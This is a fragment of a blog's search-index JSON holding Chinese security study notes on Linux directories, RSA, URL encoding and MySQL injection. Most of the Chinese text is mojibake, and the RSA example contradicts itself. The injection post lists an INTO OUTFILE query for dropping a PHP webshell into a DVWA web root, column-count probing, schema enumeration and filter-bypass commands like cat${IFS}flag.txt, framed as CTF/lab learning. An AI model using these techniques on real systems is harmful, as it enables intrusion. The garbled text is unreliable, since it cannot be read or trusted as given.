-å‰è€…åªæ˜¯åˆ‡æ¢rootèº«ä»½ï¼Œä½†shellç¯å¢ƒä»ç„¶æ˜¯æ™®é€šç”¨æˆ·çš„shellï¼›è€Œåè€…è¿ç”¨æˆ·å’Œshellç¯å¢ƒä¸€èµ·åˆ‡æ¢æˆrootèº«ä»½äº†ã€‚åªæœ‰åˆ‡æ¢äº†shellç¯å¢ƒæ‰ä¸ä¼šå‡ºç°PATHç¯å¢ƒå˜é‡é”™è¯¯ã€‚suåˆ‡æ¢æˆrootç”¨æˆ·ä»¥åï¼Œpwdä¸€ä¸‹ï¼Œå‘ç°å·¥ä½œç›®å½•ä»ç„¶æ˜¯æ™®é€šç”¨æˆ·çš„å·¥ä½œç›®å½•ï¼›è€Œç”¨su - å‘½ä»¤åˆ‡æ¢ä»¥åï¼Œå·¥ä½œç›®å½•å˜æˆrootå·¥ä½œç›®å½•äº†ã€‚Linuxæ–‡ä»¶ç›®å½• /binï¼šbinæ˜¯Binaryçš„ç¼©å†™, è¿™ä¸ªç›®å½•å­˜æ”¾ç€æœ€ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤ã€‚ /bootï¼šè¿™é‡Œå­˜æ”¾çš„æ˜¯å¯åŠ¨Linuxæ—¶ä½¿ç”¨çš„ä¸€äº›æ ¸å¿ƒæ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€äº›è¿æ¥æ–‡ä»¶ä»¥åŠé•œåƒæ–‡ä»¶ã€‚ /dev ï¼šdevæ˜¯Device(è®¾å¤‡)çš„ç¼©å†™, è¯¥ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯Linuxçš„å¤–éƒ¨è®¾å¤‡ï¼Œåœ¨Linuxä¸­è®¿é—®è®¾å¤‡çš„æ–¹å¼å’Œè®¿é—®æ–‡ä»¶çš„æ–¹å¼æ˜¯ç›¸åŒçš„ã€‚ /etcï¼šè¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½•ã€‚ /homeï¼šç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œåœ¨Linuxä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œä¸€èˆ¬è¯¥ç›®å½•åæ˜¯ä»¥ç”¨æˆ·çš„è´¦å·å‘½åçš„ã€‚ /libï¼šè¿™ä¸ªç›®å½•é‡Œå­˜æ”¾ç€ç³»ç»Ÿæœ€åŸºæœ¬çš„åŠ¨æ€è¿æ¥å…±äº«åº“ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºWindowsé‡Œçš„DLLæ–‡ä»¶ã€‚å‡ ä¹æ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½éœ€è¦ç”¨åˆ°è¿™äº›å…±äº«åº“ã€‚ /lost+foundï¼šè¿™ä¸ªç›®å½•ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ç©ºçš„ï¼Œå½“ç³»ç»Ÿéæ³•å…³æœºåï¼Œè¿™é‡Œå°±å­˜æ”¾äº†ä¸€äº›æ–‡ä»¶ã€‚ /mediaï¼šlinuxç³»ç»Ÿä¼šè‡ªåŠ¨è¯†åˆ«ä¸€äº›è®¾å¤‡ï¼Œä¾‹å¦‚Uç›˜ã€å…‰é©±ç­‰ç­‰ï¼Œå½“è¯†åˆ«åï¼Œlinuxä¼šæŠŠè¯†åˆ«çš„è®¾å¤‡æŒ‚è½½åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚ /mntï¼šç³»ç»Ÿæä¾›è¯¥ç›®å½•æ˜¯ä¸ºäº†è®©ç”¨æˆ·ä¸´æ—¶æŒ‚è½½åˆ«çš„æ–‡ä»¶ç³»ç»Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…‰é©±æŒ‚è½½åœ¨/mnt/ä¸Šï¼Œç„¶åè¿›å…¥è¯¥ç›®å½•å°±å¯ä»¥æŸ¥çœ‹å…‰é©±é‡Œçš„å†…å®¹äº†ã€‚ /optï¼š è¿™æ˜¯ç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½•ã€‚æ¯”å¦‚ä½ å®‰è£…ä¸€ä¸ªORACLEæ•°æ®åº“åˆ™å°±å¯ä»¥æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚é»˜è®¤æ˜¯ç©ºçš„ã€‚ /procï¼šè¿™ä¸ªç›®å½•æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ç›®å½•ï¼Œå®ƒæ˜¯ç³»ç»Ÿå†…å­˜çš„æ˜ å°„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•æ¥è·å–ç³»ç»Ÿä¿¡æ¯ã€‚è¿™ä¸ªç›®å½•çš„å†…å®¹ä¸åœ¨ç¡¬ç›˜ä¸Šè€Œæ˜¯åœ¨å†…å­˜é‡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹é‡Œé¢çš„æŸäº›æ–‡ä»¶ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥å±è”½ä¸»æœºçš„pingå‘½ä»¤ï¼Œä½¿åˆ«äººæ— æ³•pingä½ çš„æœºå™¨ï¼š /rootï¼šè¯¥ç›®å½•ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼Œä¹Ÿç§°ä½œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½•ã€‚ /sbinï¼šså°±æ˜¯Super Userçš„æ„æ€ï¼Œè¿™é‡Œå­˜æ”¾çš„æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„ç³»ç»Ÿç®¡ç†ç¨‹åºã€‚ /selinuxï¼š è¿™ä¸ªç›®å½•æ˜¯Redhat/CentOSæ‰€ç‰¹æœ‰çš„ç›®å½•ï¼ŒSelinuxæ˜¯ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œç±»ä¼¼äºwindowsçš„é˜²ç«å¢™ï¼Œä½†æ˜¯è¿™å¥—æœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œè¿™ä¸ªç›®å½•å°±æ˜¯å­˜æ”¾selinuxç›¸å…³çš„æ–‡ä»¶çš„ã€‚ /srvï¼š è¯¥ç›®å½•å­˜æ”¾ä¸€äº›æœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦æå–çš„æ•°æ®ã€‚ /sysï¼š è¿™æ˜¯linux2.6å†…æ ¸çš„ä¸€ä¸ªå¾ˆå¤§çš„å˜åŒ–ã€‚è¯¥ç›®å½•ä¸‹å®‰è£…äº†2.6å†…æ ¸ä¸­æ–°å‡ºç°çš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ sysfs ã€‚ sysfsæ–‡ä»¶ç³»ç»Ÿé›†æˆäº†ä¸‹é¢3ç§æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ï¼šé’ˆå¯¹è¿›ç¨‹ä¿¡æ¯çš„procæ–‡ä»¶ç³»ç»Ÿã€é’ˆå¯¹è®¾å¤‡çš„devfsæ–‡ä»¶ç³»ç»Ÿä»¥åŠé’ˆå¯¹ä¼ªç»ˆç«¯çš„devptsæ–‡ä»¶ç³»ç»Ÿã€‚è¯¥æ–‡ä»¶ç³»ç»Ÿæ˜¯å†…æ ¸è®¾å¤‡æ ‘çš„ä¸€ä¸ªç›´è§‚åæ˜ ã€‚ å½“ä¸€ä¸ªå†…æ ¸å¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œå¯¹åº”çš„æ–‡ä»¶å’Œç›®å½•ä¹Ÿåœ¨å†…æ ¸å¯¹è±¡å­ç³»ç»Ÿä¸­è¢«åˆ›å»ºã€‚ /tmpï¼šè¿™ä¸ªç›®å½•æ˜¯ç”¨æ¥å­˜æ”¾ä¸€äº›ä¸´æ—¶æ–‡ä»¶çš„ã€‚ /usrï¼š è¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç›®å½•ï¼Œç”¨æˆ·çš„å¾ˆå¤šåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶éƒ½æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œç±»ä¼¼äºwindowsä¸‹çš„program filesç›®å½•ã€‚ /usr/binï¼šç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºã€‚ /usr/sbinï¼šè¶…çº§ç”¨æˆ·ä½¿ç”¨çš„æ¯”è¾ƒé«˜çº§çš„ç®¡ç†ç¨‹åºå’Œç³»ç»Ÿå®ˆæŠ¤ç¨‹åºã€‚ /usr/srcï¼šå†…æ ¸æºä»£ç é»˜è®¤çš„æ”¾ç½®ç›®å½•ã€‚ /varï¼šè¿™ä¸ªç›®å½•ä¸­å­˜æ”¾ç€åœ¨ä¸æ–­æ‰©å……ç€çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬ä¹ æƒ¯å°†é‚£äº›ç»å¸¸è¢«ä¿®æ”¹çš„ç›®å½•æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚åŒ…æ‹¬å„ç§æ—¥å¿—æ–‡ä»¶ã€‚ /runï¼šæ˜¯ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œå­˜å‚¨ç³»ç»Ÿå¯åŠ¨ä»¥æ¥çš„ä¿¡æ¯ã€‚å½“ç³»ç»Ÿé‡å¯æ—¶ï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶åº”è¯¥è¢«åˆ æ‰æˆ–æ¸…é™¤ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰ /var/run ç›®å½•ï¼Œåº”è¯¥è®©å®ƒæŒ‡å‘ run","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"}]},{"title":"RSA Encryption","slug":"RSA-AES-Encryption","date":"2020-03-27T03:18:31.000Z","updated":"2020-03-30T02:51:04.088Z","comments":true,"path":"2020/03/27/RSA-AES-Encryption/","link":"","permalink":"https://polosec.github.io/2020/03/27/RSA-AES-Encryption/","excerpt":"","text":"è‡´æ•¬ã€å‚è€ƒhttps://blog.csdn.net/dbs1215/article/details/48953589https://www.jianshu.com/p/0f9b72d691c2https://blog.csdn.net/weixin_37490221/article/details/80823129 RSARSAåŸºæœ¬æ¦‚å¿µRSAæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚å½“æ—¶å­¦è®¡ç®—æœºç½‘ç»œçš„æ—¶å€™å¯¹å¯¹ç§°ã€éå¯¹ç§°çš„æ¦‚å¿µå¾ˆæ¨¡ç³Šï¼Œæ€»æ˜¯è®°ä¸æ¸…ã€‚å‰ä¸¤å¤©SSHç™»å½•å°è¯•äº†RSAå…å¯†ç™»å½•ï¼Œç»“åˆä¹‹å‰é—®è¿‡çš„è€å¸ˆçš„ç›¸å…³å†…å®¹ï¼Œå¯¹RSAçš„æ•´ä¸ªè¿‡ç¨‹æœ‰äº†ä¸€ä¸ªå¤§è‡´çš„äº†è§£ã€‚ç§é’¥ä¸€å®šåªæœ‰è‡ªå·±çŸ¥é“æ‰èƒ½ä¿è¯å®‰å…¨ï¼ï¼å¯†æ–‡=(æ˜æ–‡E)mod Næ˜æ–‡=(å¯†æ–‡D)mod Nç¬¦å·è¯´æ˜ï¼šNï¼šç”±ä¸¤ä¸ªè´¨æ•°pqæ„æˆã€‚Lï¼š1&lt;L&lt;lcm(p-1,q-1) (p-1,q-1çš„æœ€å°å…¬å€æ•°)Eï¼š1&lt;E&lt;L &amp;&amp; gcd(E,L)=1D: 1&lt;D&lt;L &amp;&amp; ED mod L=1 (è¿™ä¹Ÿå°è¯äº†å¯¹Eçš„å®šä¹‰ä¸­ä¸ºä»€ä¹ˆEå’ŒLè¦äº’è´¨) å®ç°è¿‡ç¨‹å–p=17,q=19,åˆ™N=323åˆ™L=lcm(16,18)=144âˆµ1&lt;E&lt;L &amp;&amp; gcd(E,L)=1âˆ´ E=5ç”±1&lt;D&lt;L &amp;&amp; ED mod L=1å¯å¾—ï¼š7*D MOD 144 =1 -&gt; 5D=145n(nâˆˆN)ï¼ˆè¿™é‡Œçš„N*ä»£è¡¨æ­£æ•´æ•°ï¼‰å¯å¾—D=29åˆ™ï¼šå…¬é’¥å¯¹(E,N)=(5,323)ç§é’¥å¯¹(D,N)=(29,323)è®¾åŸå§‹æ¶ˆæ¯M=233ï¼Œç»ç§é’¥åŠ å¯†åçš„å¯†æ–‡=æ˜æ–‡E mod N=275è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæ˜æ–‡=å¯†æ–‡D mod N=233ï¼Œè¿˜åŸæˆåŠŸã€‚ RSAå·¥ä½œè¿‡ç¨‹åŸå§‹éœ€è¦å‘é€çš„æ¶ˆæ¯ä¸ºmå…¬é’¥åŠ å¯†æ–¹æ³•ä¸ºpubencode()å…¬é’¥è§£å¯†æ–¹æ³•ä¸ºpubdecode()å…¬é’¥åŠ å¯†/è§£å¯†å¾—åˆ°çš„å†…å®¹ä¸ºpub(m)ç§é’¥åŠ å¯†æ–¹æ³•ä¸ºpriencode()ç§é’¥è§£å¯†æ–¹æ³•ä¸ºpridecode()ç§é’¥åŠ å¯†/è§£å¯†å¾—åˆ°çš„å†…å®¹ä¸ºpri(m)Clientâ€”â€”â€”â€”â€”â€”â€”â€”â€“transmitting â€”â€”â€”â€”ServerM1-&gt;priencode()-&gt;pri(M1)-&gt; â€¦â€¦â€¦â€¦.. pri(M1)-&gt;pubdecode()-&gt;M1M2&lt;-pridecode()&lt;-pub(M2)&lt;- â€¦â€¦â€¦â€¦.. pub(M2)&lt;-pubencode()&lt;-M2 SSHå…å¯†ç™»é™†åŸºäºå£ä»¤çš„éªŒè¯ åŸºäºå¯†é’¥çš„éªŒè¯ä½¿ç”¨RSAçš„å…¬é’¥ã€ç§é’¥æœºåˆ¶å¯ä»¥å®ç°sshå…å¯†ç™»å½•ã€‚å·¥ä½œæµç¨‹ï¼š1.clientç”Ÿæˆå…¬é’¥ï¼Œç§é’¥ï¼Œå¹¶ä¸”æŠŠå…¬é’¥å­˜å‚¨åœ¨serverçš„authorized_keysæ–‡ä»¶é‡Œé¢2.clientå‘é€è¿æ¥è¯·æ±‚ï¼Œå‘é€å…¬é’¥3.serverå¦‚æœå‘ç°clientçš„å…¬é’¥åœ¨authorized_keysæ–‡ä»¶é‡Œé¢çš„è¯ï¼Œä¼šç”Ÿæˆä¸€æ®µéšæœºå­—ç¬¦ä¸²ç”¨å…¬é’¥åŠ å¯†å‘é€ç»™client4. clientæ”¶åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²åä½¿ç”¨ç§é’¥è§£å¯†ï¼Œç„¶åæŠŠè§£å¯†åçš„å­—ç¬¦ä¸²å‘ç»™server5.serveréªŒè¯å­—ç¬¦ä¸²æ˜¯å¦å’Œå‘é€çš„ç›¸ç­‰ï¼Œç›¸ç­‰çš„è¯åˆ™å»ºç«‹é“¾æ¥ã€‚","categories":[],"tags":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"URLç¼–ç è§£ç ","slug":"URLç¼–ç ","date":"2020-03-26T12:29:53.000Z","updated":"2020-03-29T12:46:18.208Z","comments":true,"path":"2020/03/26/URLç¼–ç /","link":"","permalink":"https://polosec.github.io/2020/03/26/URL%E7%BC%96%E7%A0%81/","excerpt":"","text":"æµ®ç”Ÿæ—¥è®°3.26 é˜´ URLç¼–ç å‚è€ƒï¼šhttps://blog.csdn.net/ljhabc1982/article/details/7094757https://www.cnblogs.com/jerrysion/p/5522673.htmlhttps://www.cnblogs.com/mengff/p/7282488.htmlhttps://blog.csdn.net/danielzhou888/article/details/72861097URLç¼–ç æ¦‚å¿µæçš„ä¸è°ˆã€‚åªæœ‰æ•°å­—ï¼Œå¤§å°å†™å­—æ¯ï¼Œç‰¹å®šçš„ä¿ç•™å­—æ‰ä¸ä¼šè¿›è¡ŒURLç¼–ç ã€‚ Understanding of Content-Typeåœ¨HTTPè¯·æ±‚å’Œå“åº”æŠ•ä¸­ç”¨Content-Typeæ¥è¡¨ç¤ºå…·ä½“è¯·æ±‚ä¸­çš„åª’ä½“ç±»å‹ä¿¡æ¯ã€‚ å¸¸è§çš„åª’ä½“æ ¼å¼ç±»å‹å¦‚ä¸‹ï¼š text/html ï¼š HTMLæ ¼å¼ text/plain ï¼šçº¯æ–‡æœ¬æ ¼å¼ text/xml ï¼š XMLæ ¼å¼ image/gif ï¼šgifå›¾ç‰‡æ ¼å¼ image/jpeg ï¼šjpgå›¾ç‰‡æ ¼å¼ image/pngï¼špngå›¾ç‰‡æ ¼å¼ ä»¥applicationå¼€å¤´çš„åª’ä½“æ ¼å¼ç±»å‹ï¼š application/xhtml+xml ï¼šXHTMLæ ¼å¼ application/xml ï¼š XMLæ•°æ®æ ¼å¼ application/atom+xml ï¼šAtom XMLèšåˆæ ¼å¼ application/json ï¼š JSONæ•°æ®æ ¼å¼ application/pdf ï¼špdfæ ¼å¼ application/msword ï¼š Wordæ–‡æ¡£æ ¼å¼ application/octet-stream ï¼š äºŒè¿›åˆ¶æµæ•°æ®ï¼ˆå¦‚å¸¸è§çš„æ–‡ä»¶ä¸‹è½½ï¼‰ application/x-www-form-urlencoded ï¼š ä¸­é»˜è®¤çš„encTypeï¼Œformè¡¨å•æ•°æ®è¢«ç¼–ç ä¸ºkey/valueæ ¼å¼å‘é€åˆ°æœåŠ¡å™¨ï¼ˆè¡¨å•é»˜è®¤çš„æäº¤æ•°æ®çš„æ ¼å¼ï¼‰ multipart/form-data ï¼š éœ€è¦åœ¨è¡¨å•ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨è¯¥æ ¼å¼ get/post of formå¦‚æœenctypeä¸ºé»˜è®¤çš„application/x-www-form-urlencodedæ—¶ï¼šformçš„methodä¸ºgetæ—¶è¯ï¼Œåˆ™æŠŠå‚æ•°æŒ‰ç…§?k1=v1&amp;k2=v2çš„å½¢å¼æ‹¼æ¥åˆ°URLçš„åé¢ç›´æ¥è®¿é—®ã€‚firnçš„methodä¸ºpostçš„è¯ï¼Œåˆ™æŠŠå‚æ•°æ”¾ä»¥k1=v1&amp;k2=v2çš„å½¢å¼åˆ°è¯·æ±‚ä½“é‡Œé¢ã€‚åœ¨æœ‰ input type=file æ—¶å€™ï¼Œè¦ç”¨multipart/form-dataç¼–ç æ–¹å¼ã€‚æµè§ˆå™¨ä¼šæŠŠè¡¨å•ä»¥æ§ä»¶ä¸ºå•ä½åˆ†å‰²ï¼Œæ¯ä¸ªéƒ¨åˆ†ä½¿ç”¨ â€“boundary åˆ†å‰²å¼€æ¥ï¼Œæœ€åä¸€è¡Œä½¿ç”¨ â€“boundaryâ€“ ç»“å°¾ï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªéƒ¨åˆ†åŠ ä¸ŠContent-Dispositon(form-dataæˆ–file)ã€Content-Type(é»˜è®¤text/plain)ã€name(æ§ä»¶name)ç­‰ä¿¡æ¯ï¼Œå¹¶åŠ ä¸Šåˆ†å‰²ç¬¦(boundary)ã€‚ä¸¾ä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657é€šè¿‡formè¡¨å•æäº¤æ–‡ä»¶æ“ä½œå¦‚ä¸‹ï¼š&lt;form method=&quot;post&quot;action=&quot;http://w.sohu.com/t2/upload.do&quot; enctype=â€multipart/form-dataâ€&gt; &lt;inputtype=&quot;text&quot; name=&quot;desc&quot;&gt; &lt;inputtype=&quot;file&quot; name=&quot;pic&quot;&gt; &lt;/form&gt; æµè§ˆå™¨å°†ä¼šå‘é€ä»¥ä¸‹æ•°æ®ï¼šPOST /t2/upload.do HTTP/1.1User-Agent: SOHUWapRebotAccept-Language: zh-cn,zh;q=0.5Accept-Charset: GBK,utf-8;q=0.7,*;q=0.7Connection: keep-aliveContent-Length: 60408Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCHost: w.sohu.com --ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCContent-Disposition: form-data;name=&quot;desc&quot;Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit [......][......][......][......]...........................--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCContent-Disposition: form-data;name=&quot;pic&quot;; filename=&quot;photo.jpg&quot;Content-Type: application/octet-streamContent-Transfer-Encoding: binary [å›¾ç‰‡äºŒè¿›åˆ¶æ•°æ®]--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC-- å¯¹URLç¼–ç çš„ç†è§£ï¼šåœ¨æµè§ˆå™¨å‘é€è¯·æ±‚å‰ï¼Œå¦‚æœå‘ç°ä¼ å…¥çš„å‚æ•°åŒ…æ‹¬äº†é™¤ä¿ç•™å­—å’Œéä¿ç•™å­—ä¹‹å¤–çš„å­—ç¬¦ï¼Œåˆ™éœ€è¦è¿›è¡ŒURLç¼–ç ï¼Œç„¶åè¿›è¡Œä¼ è¾“ã€‚æœåŠ¡å™¨æ¥å—åˆ°è¯·æ±‚åä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡è§£ç è¿‡ç¨‹ã€‚å³ï¼šå®¢æˆ·ç«¯å‘é€è¯·æ±‚å‰ç¡®ä¿URLç¬¦åˆè§„èŒƒï¼›å¦åˆ™è¿›è¡ŒURLç¼–ç ï¼›-&gt;ä¼ é€åˆ°æœåŠ¡ç«¯é»˜è®¤è¿›è¡Œä¸€æ¬¡URLè§£ç ï¼›ç„¶åæœåŠ¡å™¨ç«¯è¿›è¡Œä¸€æ¬¡URLç¼–ç åå‘é€ç»™å®¢æˆ·ç«¯-&gt;å®¢æˆ·ç«¯è¿›è¡ŒURLè§£ç å¹¶æ˜¾ç¤ºã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ã€‚å¦‚æœæˆ‘çš„è¯·æ±‚å‚æ•°ä¸­å­˜åœ¨ç‰¹æ®Šç¬¦å·ï¼Œé‚£ä¹ˆç¼–ç åˆæ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿæ¯”å¦‚param1=admin+1å¦‚æœè¿™æ ·ç›´æ¥æäº¤è¯·æ±‚çš„è¯ï¼Œæµè§ˆå™¨æ£€æŸ¥é€šè¿‡ï¼Œç›´æ¥å‘é€ï¼ˆå› ä¸º+æ˜¯ä¿ç•™å­—ï¼Œè¢«ç¿»è¯‘æˆç©ºæ ¼ï¼‰åœ¨bingæœç´¢123%123 å…¶å®æœå‡ºæ¥çš„æ˜¯123 123ä¸‹å›¾æ˜¯è¾“å…¥ç¼–ç åçš„æ•°æ®%2bçš„æƒ…å†µï¼šä¸‹å›¾æ˜¯ç›´æ¥è¾“å…¥+çš„æƒ…å†µ ä¿ç•™å­—ç¬¦ä¸ç”¨äºURIåˆ†éš”ç¬¦ï¼Œè€Œæ˜¯ç”¨äºå…¶å®ƒä½ç½®ï¼Œæ¯”å¦‚å‚æ•°çš„valueæ—¶ï¼Œè¦å¯¹è¿™æ—¶ç”¨åˆ°çš„ä¿ç•™å­—ç¬¦åšURLç¼–ç ã€‚æ¯”å¦‚pa1=admin&amp;pa3 , pa2=123123å¦‚æœä¸å¯¹valueä¸­çš„ä¿ç•™å­—è¿›è¡Œç¼–ç çš„è¯ï¼Œåˆ™ç»“æœæ˜¯è¿™æ ·çš„ï¼špa1=admin&amp;pa3&amp;pa2=123123å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"mysqlæ³¨å…¥åŸºç¡€&LinuxåŸºç¡€","slug":"mysqlæ³¨å…¥åŸºç¡€","date":"2020-03-26T12:29:53.000Z","updated":"2020-03-29T12:51:07.850Z","comments":true,"path":"2020/03/26/mysqlæ³¨å…¥åŸºç¡€/","link":"","permalink":"https://polosec.github.io/2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"è‡´æ•¬https://www.freebuf.com/column/201364.html basic stucture of mysql databasemysql5å†…ç½®ç³»ç»Ÿæ•°æ®åº“IFORMATION_SCHEMAï¼Œè®°å½•äº†æ•°æ®åº“ä¸­æ‰€æœ‰çš„æ•°æ®åº“åã€æ•°æ®åº“è¡¨åã€æ•°æ®åº“è¡¨å­—æ®µåã€‚å…¶ä¸­çš„å…³é”®è¡¨ï¼šSCHEMATAï¼Œå­˜å‚¨æ•°æ®åº“åï¼Œå…³é”®å­—æ®µï¼šSCHEMA_NAME -&gt;æ•°æ®åº“åç§°ä¾‹å¥:select schema_name from INFORMATION_SCHEMA.SCHEMATA; åˆ™æŸ¥è¯¢åˆ°çš„æ˜¯å½“å‰æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€‚tables:å­˜å‚¨è¡¨åå…³é”®å­—æ®µï¼šTABLE_SCHEMA -&gt;è¡¨ç¤ºè¯¥è¡¨åå±äºå“ªä¸ªæ•°æ®åº“åå…³é”®å­—æ®µï¼šTABLE_NAME -&gt;å­˜å‚¨è¡¨çš„è¡¨åä¾‹å¥ select table_name from INFORMATION_SCHEMA.tables ; //æŸ¥è¯¢æ‰€æœ‰çš„è¡¨åselect table_name from INFORMATION_SCHEMA.tables where table_schema=â€™dvwaâ€™; //æŸ¥è¯¢dvwaæ•°æ®åº“çš„è¡¨åcolumns:å­˜å‚¨åˆ—åå…³é”®å­—æ®µï¼šTABLE_SCHEMA -&gt;è¯¥å­—æ®µæ‰€å±æ•°æ®åº“å å…³é”®å­—æ®µï¼šTABLE_NAME -&gt;å­˜å‚¨æ‰€å±è¡¨çš„åç§° å…³é”®å­—æ®µï¼šCOLUMN_NAME -&gt;è¯¥å­—æ®µçš„åç§°ä¾‹å¥ï¼š select column_name from INFORMATION_SCHEMA.columns where table_name=â€™usersâ€™ and table_schema=â€™dvwaâ€™;//æŸ¥æ‰¾dvwaæ•°æ®åº“ä¸­userè¡¨ä¸­æ‰€æœ‰å­—æ®µå¸¸ç”¨å˜é‡Select database() æ•°æ®åº“åç§°Select VERSION() æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯Select @@VERSION æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯Select @@GLOBAL.VERSION æ•°æ®åº“ç‰ˆæœ¬ä¿¡user() ç³»ç»Ÿç”¨æˆ·å’Œç™»å½•ä¸»æœºåcurrent_user() å½“å‰ç™»å½•ç”¨æˆ·å’Œç™»å½•ä¸»æœºåsystem_user() æ•°æ®åº“ç³»ç»Ÿç”¨æˆ·è´¦æˆ·åç§°å’Œç™»å½•ä¸»æœºåsession_user() å½“å‰ä¼šè¯ç”¨æˆ·åå’Œç™»å½•ä¸»æœºå å†™ä¸€å¥è¯select â€˜â€™intooutfile â€˜/var/www/html/dvwa/1.phpâ€™; //å¯¼å‡ºä¸€å¥è¯æœ¨é©¬ åˆ¤æ–­åˆ—æ•°order by nå¦‚æœorder by næŠ¥é”™å¹¶ä¸”order by n-1è¿”å›ç»“æœï¼Œåˆ™åˆ—æ•°ä¸ºn-1 linuxå‘½ä»¤find(å¾…è¡¥å……)find / -name â€˜flaâ€˜ æŸ¥æ‰¾æ‰€æœ‰åŒ…å«flaçš„æ–‡ä»¶find / -name flag æŸ¥æ‰¾æ‰€æœ‰ä»¥flagå‘½åçš„æ–‡ä»¶-inameé€‰é¡¹ä¸åŒºåˆ†å¤§å°å†™ ç©ºæ ¼ç»•è¿‡cat flag.txtcat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txt lsls -l åˆ—å‡ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚æƒé™ å¤§å° æ‰€æœ‰è€…å’Œæ‰€å±ç»„ï¼Œä¿®æ”¹æ—¶é—´ç­‰ls -all / ll æ˜¾ç¤ºéšè—æ–‡ä»¶ã€åˆ—å‡ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚æƒé™ å¤§å° æ‰€æœ‰è€…å’Œæ‰€å±ç»„ï¼Œä¿®æ”¹æ—¶é—´ç­‰-rwxrw-râ€-1 root root 1213 Feb 2 09:39 abcç¬¬ä¸€ä¸ª-ä»£è¡¨æ–‡ä»¶ï¼Œdä»£è¡¨ç›®å½•,lä»£è¡¨é“¾æ¥ã€‚r è¯» wå†™ xæ‰§è¡Œä¸‰æ®µåˆ†åˆ«å¯¹åº”ç”¨æˆ·ã€ç»„ã€å…¶ä»–çš„æƒé™ã€‚ root root åˆ†åˆ«è¡¨ç¤ºç”¨æˆ·ã€ç”¨æˆ·æ‰€åœ¨çš„ç»„ chmodchmod u/g/o +/-/= r/w/x filenamechmod u+x 1.txt å½“å‰userå¯æ‰§è¡Œ1.txtchmod 755 1.txt 